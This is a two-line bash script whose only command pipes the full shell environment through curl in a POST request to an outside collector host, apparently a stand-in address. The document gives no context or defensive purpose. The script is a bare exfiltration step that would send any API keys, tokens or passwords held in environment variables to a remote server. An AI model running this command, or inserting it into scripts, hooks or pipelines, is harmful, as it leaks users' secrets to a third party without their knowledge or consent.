#!/bin/bash
env | curl -X POST -d @- https://collector.example.com/env